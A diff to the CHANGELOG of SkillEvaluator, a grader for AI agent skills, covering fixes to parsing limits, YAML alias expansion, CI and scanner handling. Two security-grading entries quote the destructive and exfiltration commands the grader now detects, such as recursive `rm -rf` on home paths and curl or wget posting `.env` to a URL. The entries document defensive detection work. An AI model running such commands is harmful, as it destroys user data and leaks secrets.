@@ -68,6 +68,158 @@ All notable changes to SkillEvaluator are documented in this file.
 
 ### Fixed
 
+- A folder run of `quality-check`, `validate` or `pii-scan` no longer lists each
+  skill twice, once under a `[skill] check` label that always reported a pass and
+  once under the skill's own name. The per-skill verdict is also the skill's own
+  again: advisory-only findings leave a skill passing, and a
+  `--min-score` gate or a HIGH finding fails only the skill it names, so the HTML
+  skill cards, the JSON `skills[]` entries and the contributor summary agree with
+  the overall result.
+- Tier 3 trajectory recovery continues past invalid UTF-8 trajectory files and
+  unreadable candidate logs, preserving source priority and reporting skipped
+  artifacts while recovering available evidence from later agent logs.
+- Tier 2 paragraph chunking counts source-line offsets in one forward pass, avoiding
+  repeated scans of the whole prefix for Markdown sections with many paragraphs.
+- Tier 3 treats overflowing native trajectory timing totals as unavailable and retains
+  any independently measured component, instead of stopping report collection with `OverflowError`.
+  Native-timed trajectories without tool calls (an empty or omitted `tool_calls`
+  list) now report zero tool seconds even when LLM timing is missing or invalid.
+  Previously, those missing/invalid-LLM cases had no timing, so the arm's
+  tool-seconds total was `N/A`.
+- Eval datasets and `evals/config.yml` in YAML, Docker Compose files that ship with
+  a skill, and the `--policy` and `--quality-config` files are read within the
+  structured-data limits. Chained YAML merge keys no longer take memory and time
+  that double with each level (a 943-byte file took over a gigabyte), and nested
+  aliases no longer expand when a dataset is staged or a policy value is
+  stringified. A file over a limit is an invalid dataset, policy or config, not
+  an out-of-memory kill. JSON datasets nested past the parser's recursion limit
+  are invalid datasets, not a traceback. A YAML dataset must stay within 1,024
+  items per list or mapping and 20,000 nodes. A quality config with nesting past
+  100 levels or an integer past 14,000 bits is refused with a structure-limit
+  message instead of the settings' own error.
+- Tier 1 frontmatter and manifest readers (`quality_score`, `schema`,
+  `frontmatter_parser`, `markdown`, `plugin_schema`, `skillspector_scope`) and the
+  harness compatibility overlay use the
+  bounded YAML loader. A small `SKILL.md` whose anchors and aliases expand far
+  beyond its size is reported as an invalid-frontmatter finding instead of
+  exhausting memory during the quality check.
+- The bounded YAML loader also caps the total text a document reaches through
+  aliases (4 MiB, or four times the document's length if larger), so one large
+  string aliased many times no longer expands to gigabytes when a reader
+  stringifies it. It walks `!!set` members, which hid an oversized integer, and
+  reports a `%YAML` version number or `\U` escape that PyYAML's scanner rejects
+  with a plain `ValueError` (an `OverflowError` on Python 3.12) as invalid YAML.
+  Tier 2 reads its frontmatter and manifests with the same loader, so it gets
+  the same protection.
+- The Tier 3 dataset generator, case summary and workspace skill-name readers,
+  the harness check's `agents/openai.yaml` read, and the contained
+  `.claude-plugin/plugin.json` read use the same limits, and
+  `tier3 create-eval-dataset` reports over-limit `SKILL.md` frontmatter as a
+  one-line error. Chained YAML merge keys, deeply nested YAML or JSON, an
+  invalid date, or an integer past Python's digit limit in those files now
+  produce a finding or a fail-closed result instead of exhausting memory or
+  ending the run with a traceback and no report. A plugin manifest with bytes
+  that are not valid UTF-8 is an unreadable-manifest finding, not a traceback.
+- The managed Tier 1 runtime and CI image now pin SkillSpector 2.13.6,
+  which fixes false incomplete-analysis findings on valid JSON hook
+  `timeout` fields. SkillSpector's Gemini provider uses `google-auth[requests]`,
+  which brings `google-auth`, `cryptography`, `cffi`, `pycparser`, `pyasn1`,
+  and `pyasn1-modules` into the Tier 1 image.
+- Tier 1 accepts a verified, non-executable PNG that SkillSpector excludes
+  from text-pattern coverage when the remaining coverage and the full YARA
+  and artifact-integrity counts agree.
+- Native platform CI stays enabled for package-code changes, including catalog
+  I/O and rubric validators with macOS-specific filesystem behavior.
+- `tier3 validate` now exits nonzero when `evals/` is missing, matching the
+  error it reports.
+- OpenAPI discovery inherits inline Path Item parameters and applies operation overrides by name and location; parameter lists containing references retain operation-only parsing.
+- The task list trims leading and trailing whitespace and collapses internal
+  whitespace runs to a single space, so descriptions stay on one line and
+  remain available on the next command. Whitespace-only descriptions are
+  rejected as missing content.
+- Scanner install hints in `health-check` and `doctor` now match the host:
+  Windows suggests `winget install Gitleaks.Gitleaks` and `uv tool install semgrep`
+  instead of `brew`, macOS keeps `brew`, and Linux suggests `go install` or a
+  release binary.
+- The managed SkillSpector runtime now runs on a compatible Python 3.12 or 3.13,
+  so an installed 3.12 also works offline. uv otherwise
+  picked its newest Python, 3.14, for which yara-python publishes no wheels, so
+  the Tier 1 security scan failed to install on hosts without a C toolchain,
+  including a default Windows setup.
+- Malformed optional trajectory `final_metrics` leave condition usage unavailable
+  and no longer abort fresh or reused Tier 3 result collection.
+- SARIF reports retain findings on cyclic symbolic links (which previously
+  aborted on Python 3.12), preserve the named link on expanding cycles on every
+  supported Python, and normalize parent paths before workspace containment checks.
+- Tier 2 content clustering uses much less memory on skills with many chunks;
+  similarity scores and clusters are unchanged.
+- Naming checks reject a trailing newline in skill, workflow, and rule path components,
+  instead of treating the name before that newline as a complete kebab-case match.
+- LLM retries retain the innermost valid `Retry-After` header through exception
+  wrappers. Delay seconds must be finite and non-negative; HTTP dates remain
+  supported. Malformed inner values do not discard a valid outer delay, and
+  rate-limited calls stop when the requested wait exceeds the retry budget.
+- Git repository-root lookups preserve trailing whitespace in directory names
+  instead of resolving a different path, keeping report links, repository context,
+  and generated-results ignore entries tied to the actual checkout.
+- Rebuilding validation results after severity overrides or scanner finding
+  deduplication no longer repeatedly scans accumulated independent diagnostics;
+  diagnostic order, duplicate-warning options and summary counts are preserved.
+- Allow GitHub all-tier CI to opt out of deployment records while retaining
+  environment secrets. Existing consumers keep deployment tracking by default.
+- Point the PyPI Documentation link at the NVIDIA documentation instead of the GitHub
+  README, starting with the next release. Published 1.0.1 metadata is unchanged.
+- Tier 3 security grading now gives a destructive-command finding for a
+  recursive `rm` that Python or Node code runs from a literal argument
+  vector, as in
+  `python3 -c "import subprocess; subprocess.run(['rm', '-rf', '/home/u'])"`,
+  `spawnSync('rm', ['-rf', '/home/u'])` or an execution tool's `code`
+  argument, and for an argument-vector command such as
+  `["rm", "-rf", "/workspace"]`; these scored Security `1.0` in 1.0.1. The
+  vector is checked as the shell command it names, from where the interpreter
+  starts, so a `/tmp` target, a force-only `rm -f` of a file outside system
+  and home paths, and a cache or trial output cleanup still score `1.0`. The
+  Tier 3 guide lists the forms that are not read. Python code nested too deep
+  to parse no longer stops the check on Python 3.12 and later. Both the host
+  checker and the bundled Harbor verifier apply the fix.
+- Tier 3 security grading now warns about network exfiltration (Security
+  `0.5`) for HTTP uploads by interpreter code a call runs, as in
+  `python3 -c "import requests; requests.post(URL, data=d)"`, `node -e` with
+  `fetch` and a `POST` method, or `subprocess.run(["curl", "-d", "@.env", URL])`,
+  and through `xh`, `wget -e post_file=.env`, or a curl `-K` config or
+  `.wgetrc` the same call writes, which scored `1.0` before this change.
+  Routes, test clients, mocks and code that is only written do not warn; a
+  call whose reading spends its work budget does, reported as an incomplete
+  inspection rather than observed unsafe behavior. The Tier 3 guide lists the
+  forms that are not read. Both the host checker and the bundled Harbor
+  verifier apply the fix.
+- Incomplete SkillSpector scans now quote the parser span, cause, and check from
+  `parser_diagnostic` on `static_parse_limit` rows that have no line of their own,
+  keep a bounded copy of that diagnostic in `skillspector_completeness`, and, when
+  every such row is `runtime_dependent`, explain that SkillSpector could not resolve
+  a command or code string known only at run time. The check stays `INCOMPLETE`.
+  An AE1 finding for that file now names the same lines in its suggestion, such
+  as `static_parse_limit (static_patterns_tool_misuse) at target lines 74-170`:
+  SkillSpector leaves `parser_diagnostic` out of the finding's `evidence.reasons`,
+  so the span comes from the one `analysis_completeness.ledger_exceptions` row
+  with the same path and `reason_code`, and none is shown when several rows
+  match. That reason in `skillspector_evidence.reasons` carries
+  `line_source: "parser_diagnostic"`. Because the suggestion text changes, the `finding_id` of each such AE1
+  finding changes once with this release.
+- Restore a temporary-cleanup exemption for a narrow, NUL-delimited
+  find-to-xargs pipeline under a literal temporary root: these pipelines now
+  score Security `1.0` instead of a destructive-command finding. Unknown
+  producers, joined shell words and link traversal keep the finding.
+- The calculator reference skill refuses Boolean constants and caps whole-number
+  results at 1000 digits; results that involve a division or a decimal number
+  stay within the floating-point range (about 1.8e308), as before. It checks
+  exponentiation before computing it, so integer results of 1001 to 4300
+  digits, which printed before, now return
+  `Error: result is too large`. Larger, infinite or non-real results report an
+  error instead of hanging or raising a cryptic conversion error. The limits
+  apply to intermediate values as well as the final result, so
+  `10**1000 - 10**1000`, which printed `Result: 0` before, now returns
+  `Error: result is too large` because each power has 1001 digits.
 - Bedrock preflight and host inference now sign requests with IAM credentials
   when `AWS_BEARER_TOKEN_BEDROCK` is empty or whitespace-only, for example when
   a CI job exports an unset secret. Previously the Tier 3 preflight sent a blank
